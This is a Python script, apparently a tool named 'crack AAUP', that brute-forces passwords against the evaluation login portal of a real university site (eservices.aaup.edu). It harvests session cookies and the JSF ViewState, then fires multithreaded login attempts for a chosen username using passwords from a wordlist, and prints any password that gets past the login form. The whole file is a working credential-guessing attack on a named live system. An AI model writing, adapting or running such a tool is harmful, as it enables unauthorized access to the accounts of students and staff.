import threading
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm


password_found_event = threading.Event()

def cook():

    login_url = 'https://eservices.aaup.edu/evaluation/index.jsf'
    login_response = requests.get(login_url)
    jss = login_response.cookies.get('JSESSIONID')
    see = login_response.cookies.get('cookiesession1')
    soup = BeautifulSoup(login_response.text, 'html.parser')
    viewstate = soup.find('input', {'name': 'javax.faces.ViewState'}).get('value')
    return  jss,see,viewstate
def cou():
    with open('passwords.txt',"r")as file:
        line=file.readlines()
        count=len(line)
        return count

def req(password,usernam,pbar):

        jss,see,viewstate=cook()
        url = 'https://eservices.aaup.edu/evaluation/index.jsf'
        headers = {
        'Host': 'eservices.aaup.edu',
        'Cookie': f'JSESSIONID={jss}; cookiesession1={see}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/xml, text/xml, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Faces-Request': 'partial/ajax',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://eservices.aaup.edu',
        'Referer': 'https://eservices.aaup.edu/evaluation/index.jsf',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers',
        'Connection': 'close'
            }
        data = {
       'javax.faces.partial.ajax': 'true',
       'javax.faces.source': 'loginForm:add',
       'javax.faces.partial.execute': '@all',
       'javax.faces.partial.render': 'loginForm',
       'loginForm:add': 'loginForm:add',
       'loginForm': 'loginForm',
       'loginForm:user_name': usernam,
       'loginForm:password': password,
        'javax.faces.ViewState': viewstate
         }

        response = requests.post(url, headers=headers, data=data)
        if "loginForm:user_name" not in response.text:
            global a
            a=password
            # print("Found =",password)
            password_found_event.set()

        pbar.update()


print("                      _         _        _   _   _ ____  ")
print("   ___ _ __ __ _  ___| | __    / \\      / \\ | | | |  _ \\ ")
print("  / __| '__/ _` |/ __| |/ /   / _ \\    / _ \\| | | | |_) |")
print(" | (__| | | (_| | (__|   <   / ___ \\  / ___ \\ |_| |  __/ ")
print("  \\___|_|  \\__,_|\\___|_|\\_\\ /_/   \\_\\/_/   \\_\\___/|_|    ")
print("                                                   BY:salamcyb    ")
print("Note if you have list password you can add it to file password.txt (:")

usernam = input("pls enter username=")
threads = []
counter=0
nuth=int(input("pls enter number threads="))
with open('password.txt', 'r') as file:
    num_lines = sum(1 for line in file)
    file.seek(0)

    with tqdm(total=num_lines) as pbar:
        for password in file:
            password = password.strip()
            counter += 1


            if counter % nuth== 0:
                for t in threads:
                    t.join()


                threads.clear()


            t = threading.Thread(target=req, args=(password, usernam, pbar))
            threads.append(t)
            t.start()


            if password_found_event.is_set():
                print("Passowrd found:",a)
                break


for t in threads:
    t.join()


